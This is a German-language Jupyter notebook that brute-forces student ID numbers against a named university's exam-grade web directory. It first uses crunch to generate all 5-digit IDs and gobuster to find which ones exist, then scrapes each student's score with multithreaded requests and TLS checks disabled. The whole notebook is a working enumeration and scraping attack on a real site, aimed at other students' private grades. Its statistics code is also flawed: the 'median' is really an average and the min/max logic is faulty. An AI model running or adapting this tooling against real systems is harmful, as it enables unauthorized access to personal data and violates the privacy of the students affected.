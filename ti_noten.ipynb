{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 1. mögliche Matrikel erzeugen\n",
    "\n",
    "crunch 5 5 0123456789 -o matrikel.txt\n",
    "\n",
    "# 2. Gültige Matrikel finden\n",
    "\n",
    "gobuster dir -u https://www.ruhr-uni-bochum.de/lmi/lehre/ti_ws2122/noten_ti_1/ -k -w matrikel.txt -o found -n --hide-length\n",
    "\n",
    "# 3. Statistiken erzeugen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from multiprocessing.pool import ThreadPool\n",
    "from multiprocessing import freeze_support\n",
    "from requests import get\n",
    "from re import findall\n",
    "import requests\n",
    "\n",
    "requests.packages.urllib3.disable_warnings()\n",
    "min, max, median, passed, not_passed = 100, 0, 0, 0, 0\n",
    "\n",
    "def main(m):\n",
    "    global min, max, median, passed, not_passed\n",
    "    r = get(f\"https://www.ruhr-uni-bochum.de/lmi/lehre/ti_ws2122/noten_ti_1{m}\", verify=False)\n",
    "    note = int(findall(\"\\d+ P\",r.text)[0][:-2])\n",
    "    if note < min: min = note\n",
    "    elif note > max: max = note\n",
    "    median += note\n",
    "    if note<50: not_passed+=1\n",
    "    else: passed+=1\n",
    "\n",
    "freeze_support()\n",
    "with open(\"found\", 'r') as f: matrikel = f.readlines()\n",
    "with ThreadPool() as p: p.map(main, list(m.strip() for m in matrikel))\n",
    "\n",
    "print(f\"Anzahl Klausuren: {len(matrikel)}\")\n",
    "print(f\"Beste Note:       {max}%\")\n",
    "print(f\"Schlechste Note:  {min}%\")\n",
    "print(f\"Median:           {median//len(matrikel)}%\")\n",
    "print(f\"Bestanden:        {passed/len(matrikel)*100:,.2f}%\")\n",
    "print(f\"Nicht-Bestanden:  {not_passed/len(matrikel)*100:,.2f}%\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.2 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "23606ec8e1a0ee9c36ab9a295ebdbf146e5ee5799bd157af85e918647be2c8e8"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
